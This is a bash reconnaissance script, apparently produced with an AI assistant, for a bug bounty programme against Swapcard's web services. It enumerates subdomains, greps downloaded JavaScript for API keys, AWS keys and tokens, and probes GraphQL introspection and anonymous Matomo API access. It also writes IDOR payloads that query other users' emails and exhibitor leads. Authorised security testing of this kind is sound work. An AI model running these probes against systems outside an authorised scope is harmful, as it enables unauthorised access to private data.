#!/usr/bin/env bash
# ============================================================
# Swapcard Bug Bounty - Recon + Analysis Script
# Program: Swapcard - YesWeHack Private BBP
# Usage: bash swapcard_recon.sh
# Requirements: curl, jq, grep, sort, uniq
# IMPORTANT: Must be run with correct User-Agent (SwapcardYWH/BB)
# ============================================================

UA="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 SwapcardYWH/BB"
OUT="swapcard_output"
mkdir -p "$OUT/js" "$OUT/responses" "$OUT/graphql" "$OUT/matomo"

# All known/discovered subdomains
TARGETS=(
  "https://app.swapcard.com"
  "https://studio.swapcard.com"
  "https://developer.swapcard.com"
  "https://vnd-api.swapcard.com"
  "https://apidev.swapcard.com"
  "https://cdn-api.swapcard.com"
  "https://chat-api.swapcard.com"
  "https://rtm.swapcard.com"
  "https://matomo.swapcard.com"
  "https://release.swapcard.com"
  "https://doc.swapcard.com"
  "https://page.swapcard.com"
)

GRAPHQL_ENDPOINTS=(
  "https://developer.swapcard.com/event-admin/graphql"
  "https://developer.swapcard.com/exhibitor/graphql"
  "https://chat-api.swapcard.com/subscriptions"
)

echo "[*] Swapcard Recon — $(date)"
echo "============================================================"

# ------------------------------------------------------------
# 1. Certificate Transparency
# ------------------------------------------------------------
echo "[1] Subdomain enum via crt.sh..."
curl -sA "$UA" "https://crt.sh/?q=%25.swapcard.com&output=json" \
  | grep -oP '"name_value":"\K[^"]+' \
  | sed 's/\\n/\n/g' \
  | grep -v '\*' \
  | sort -u \
  | tee "$OUT/subdomains.txt"
echo "[*] $(wc -l < "$OUT/subdomains.txt") subdomains"

# ------------------------------------------------------------
# 2. Fetch headers + HTML for each target
# ------------------------------------------------------------
echo ""
echo "[2] Fetching targets..."
for TARGET in "${TARGETS[@]}"; do
  HOST=$(echo "$TARGET" | sed 's|https\?://||;s|/.*||')
  echo "  -> $TARGET"
  curl -sA "$UA" -L --max-time 15 \
    -D "$OUT/responses/${HOST}_headers.txt" \
    -o "$OUT/responses/${HOST}_body.html" \
    "$TARGET"

  # Extract JS URLs
  grep -oP 'src=["'"'"']\K[^"'"'"']+\.js[^"'"'"']*' \
    "$OUT/responses/${HOST}_body.html" 2>/dev/null \
    | sed "s|^/|${TARGET}/|" \
    >> "$OUT/js/${HOST}_js_urls.txt"
done

# ------------------------------------------------------------
# 3. Download + Analyze JS bundles
# ------------------------------------------------------------
echo ""
echo "[3] Downloading JS bundles..."
cat "$OUT/js/"*.txt 2>/dev/null | sort -u > "$OUT/js/all_urls.txt"

while IFS= read -r URL; do
  [[ -z "$URL" ]] && continue
  FNAME=$(echo "$URL" | md5sum | cut -d' ' -f1).js
  curl -sA "$UA" --max-time 20 -o "$OUT/js/$FNAME" "$URL"
  echo "$URL -> $FNAME" >> "$OUT/js/map.txt"
done < "$OUT/js/all_urls.txt"

echo ""
echo "[4] Analyzing JS for secrets/endpoints..."
JS_OUT="$OUT/js_analysis.txt"
echo "JS Analysis - $(date)" > "$JS_OUT"

for F in "$OUT/js/"*.js; do
  [[ ! -f "$F" ]] && continue
  MAP=$(grep "$F" "$OUT/js/map.txt" 2>/dev/null | head -1)
  echo "" >> "$JS_OUT"
  echo "=== $MAP ===" >> "$JS_OUT"

  echo "[API PATHS]" >> "$JS_OUT"
  grep -oP '["'"'"'`](/[a-zA-Z0-9/_\-]{3,})["'"'"'`]' "$F" \
    | grep -v '\.(png\|svg\|css\|woff\|ttf\|ico)' \
    | sort -u >> "$JS_OUT"

  echo "[FULL URLS]" >> "$JS_OUT"
  grep -oP 'https?://[a-zA-Z0-9._/\-?=&%+#]+' "$F" \
    | grep -v 'example\|schema\|localhost' \
    | sort -u >> "$JS_OUT"

  echo "[SECRETS]" >> "$JS_OUT"
  grep -iP '(api[_-]?key|apikey|secret|token|password|client[_-]?id|client[_-]?secret|access[_-]?key)\s*[:=]\s*["'"'"'][^"'"'"']{8,}' \
    "$F" >> "$JS_OUT"

  echo "[AWS]" >> "$JS_OUT"
  grep -oP 'AKIA[0-9A-Z]{16}' "$F" >> "$JS_OUT"

  echo "[JWT]" >> "$JS_OUT"
  grep -oP 'eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+' "$F" \
    >> "$JS_OUT"

  echo "[postMessage]" >> "$JS_OUT"
  grep -oP '.{0,80}(addEventListener.*message|\.postMessage\(|onmessage\s*=).{0,80}' \
    "$F" >> "$JS_OUT"

  echo "[GraphQL]" >> "$JS_OUT"
  grep -oP '.{0,30}(gql`|graphql\(|query\s+\w+|mutation\s+\w+|subscription\s+\w+).{0,100}' \
    "$F" | head -30 >> "$JS_OUT"

  echo "[SWAPCARDIDS]" >> "$JS_OUT"
  grep -oP '(eventId|userId|communityId|organizationId|exhibitorId|planningId)\s*[:=]\s*["'"'"'][^"'"'"']+' \
    "$F" | head -20 >> "$JS_OUT"
done

# ------------------------------------------------------------
# 5. GraphQL Introspection Tests (UNAUTHENTICATED)
# ------------------------------------------------------------
echo ""
echo "[5] Testing GraphQL introspection (unauthenticated)..."

INTROSPECTION_QUERY='{"query":"{__schema{queryType{name}mutationType{name}types{name kind description fields{name type{name kind ofType{name kind}}}}}}"}'

for GQL in "${GRAPHQL_ENDPOINTS[@]}"; do
  HOST=$(echo "$GQL" | sed 's|https\?://||;s|/.*||')
  echo "  -> $GQL"
  RESP=$(curl -sA "$UA" \
    -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -d "$INTROSPECTION_QUERY" \
    --max-time 15)
  echo "$RESP" > "$OUT/graphql/${HOST}_introspection.json"

  if echo "$RESP" | grep -q '"__schema"'; then
    echo "  [!!!] INTROSPECTION ENABLED on $GQL"
    echo "$RESP" | jq '.data.__schema.types[].name' 2>/dev/null \
      | tee -a "$OUT/graphql/${HOST}_types.txt"
  elif echo "$RESP" | grep -q '"errors"'; then
    echo "  [AUTH REQUIRED] $GQL — $(echo "$RESP" | jq -r '.errors[0].message' 2>/dev/null)"
  else
    echo "  [UNKNOWN] Response: $(echo "$RESP" | head -c 100)"
  fi
done

# Also test with common introspection bypass techniques
echo ""
echo "[5b] Testing introspection bypass..."
BYPASS_QUERY='{"query":"query{__schema{types{name}}}"}'
BYPASS_QUERY2='{"operationName":"IntrospectionQuery","query":"fragment FullType on __Type{kind name description fields(includeDeprecated:true){name}}\nquery IntrospectionQuery{__schema{queryType{name}types{...FullType}}}"}'

for GQL in "${GRAPHQL_ENDPOINTS[@]}"; do
  HOST=$(echo "$GQL" | sed 's|https\?://||;s|/.*||')
  # Try with GET (some endpoints allow GET for introspection)
  RESP=$(curl -sA "$UA" \
    -G "$GQL" \
    --data-urlencode "query={__schema{types{name}}}" \
    --max-time 10)
  if echo "$RESP" | grep -q '"data"'; then
    echo "  [!!!] GET INTROSPECTION works on $GQL"
    echo "$RESP" > "$OUT/graphql/${HOST}_get_introspection.json"
  fi
done

# ------------------------------------------------------------
# 6. Matomo Instance Analysis
# ------------------------------------------------------------
echo ""
echo "[6] Probing Matomo instance..."
MATOMO_PATHS=(
  "/"
  "/index.php"
  "/matomo.php"
  "/piwik.php"
  "/index.php?module=API&method=API.getMatomoVersion&format=json"
  "/index.php?module=API&method=SitesManager.getAllSites&format=json&token_auth=anonymous"
  "/index.php?module=API&method=UsersManager.getUsers&format=json&token_auth=anonymous"
  "/index.php?module=Login"
  "/plugins/"
  "/config/"
  "/tmp/"
)

MATOMO_BASE="https://matomo.swapcard.com"
echo "Version check and anonymous API access:" > "$OUT/matomo/probe.txt"
for P in "${MATOMO_PATHS[@]}"; do
  STATUS=$(curl -sA "$UA" \
    -o "$OUT/matomo/$(echo "$P" | md5sum | cut -d' ' -f1).txt" \
    -w "%{http_code}" \
    --max-time 10 \
    "${MATOMO_BASE}${P}")
  echo "  [$STATUS] ${MATOMO_BASE}${P}" | tee -a "$OUT/matomo/probe.txt"
  # Check if anonymous API returned data
  if [[ "$STATUS" == "200" ]]; then
    BODY=$(cat "$OUT/matomo/$(echo "$P" | md5sum | cut -d' ' -f1).txt")
    if echo "$BODY" | grep -q '"result":\|"value":\|"sites":\|version'; then
      echo "    [!!!] DATA RETURNED — check file" | tee -a "$OUT/matomo/probe.txt"
    fi
  fi
done

# ------------------------------------------------------------
# 7. RTM endpoint probe
# ------------------------------------------------------------
echo ""
echo "[7] Probing RTM endpoint..."
RTM_PATHS=(
  "/"
  "/?app=web-user"
  "/socket.io/"
  "/info"
  "/health"
)
for P in "${RTM_PATHS[@]}"; do
  STATUS=$(curl -sA "$UA" \
    -o /tmp/rtm_resp.txt \
    -w "%{http_code}" \
    --max-time 10 \
    "https://rtm.swapcard.com${P}")
  BODY=$(cat /tmp/rtm_resp.txt | head -c 200)
  echo "  [$STATUS] https://rtm.swapcard.com${P} — $BODY"
done

# ------------------------------------------------------------
# 8. IDOR Test Templates (POST-AUTH - run after login)
# ------------------------------------------------------------
echo ""
echo "[8] Writing IDOR test payloads..."

cat > "$OUT/graphql/idor_tests.sh" << 'IDOR_EOF'
#!/usr/bin/env bash
# IDOR Test Payloads - Run after obtaining auth token
# Replace TOKEN, EVENT_ID, USER_ID, COMMUNITY_ID with real values

TOKEN="YOUR_AUTH_TOKEN_HERE"
GQL="https://developer.swapcard.com/event-admin/graphql"
UA="Mozilla/5.0 SwapcardYWH/BB"

gql_query() {
  curl -sA "$UA" -X POST "$GQL" \
    -H "Content-Type: application/json" \
    -H "Authorization: $TOKEN" \
    -d "$1"
}

echo "=== Test 1: Access other event data with your token ==="
# Try incrementing/changing eventId to another user's event
gql_query '{"query":"query{event(id:\"EVENT_ID_HERE\"){id name organizer{id email}}}"}'

echo "=== Test 2: List all communities (should be restricted) ==="
gql_query '{"query":"query{communities{edges{node{id name}}}}"}'

echo "=== Test 3: Access another user profile ==="
gql_query '{"query":"query{user(id:\"OTHER_USER_ID\"){id email firstName lastName}}"}'

echo "=== Test 4: Cross-community field management ==="
# The known issue: users with event access can manage community fields
gql_query '{"query":"query{communityCustomFields(communityId:\"COMMUNITY_ID\"){id name type}}"}'

echo "=== Test 5: Exhibitor leads IDOR ==="
EXHIBITOR_GQL="https://developer.swapcard.com/exhibitor/graphql"
curl -sA "$UA" -X POST "$EXHIBITOR_GQL" \
  -H "Content-Type: application/json" \
  -H "Authorization: $TOKEN" \
  -d '{"query":"query{leads(exhibitorId:\"OTHER_EXHIBITOR_ID\"){edges{node{id contact{email}}}}}"}'

echo "=== Test 6: Planning/schedule IDOR ==="
gql_query '{"query":"query{planning(id:\"PLANNING_ID\"){id sessions{edges{node{id title speakers{edges{node{email}}}}}}}}"}'
IDOR_EOF
chmod +x "$OUT/graphql/idor_tests.sh"

# ------------------------------------------------------------
# Summary
# ------------------------------------------------------------
echo ""
echo "============================================================"
echo "[*] Recon complete — $(date)"
echo ""
echo "PRIORITY TARGETS:"
echo "  1. matomo.swapcard.com — check $OUT/matomo/probe.txt"
echo "     Look for: version exposure, anonymous API, admin access"
echo "  2. GraphQL endpoints — check $OUT/graphql/*_introspection.json"
echo "     Look for: introspection enabled, unauthenticated queries"
echo "  3. rtm.swapcard.com — real-time messaging, check WS auth"
echo "  4. JS bundles — check $OUT/js_analysis.txt for secrets"
echo ""
echo "POST-AUTH TESTING:"
echo "  Run: $OUT/graphql/idor_tests.sh (fill in token + IDs)"
echo ""
echo "Paste output files back to Claude for analysis."
echo "============================================================"
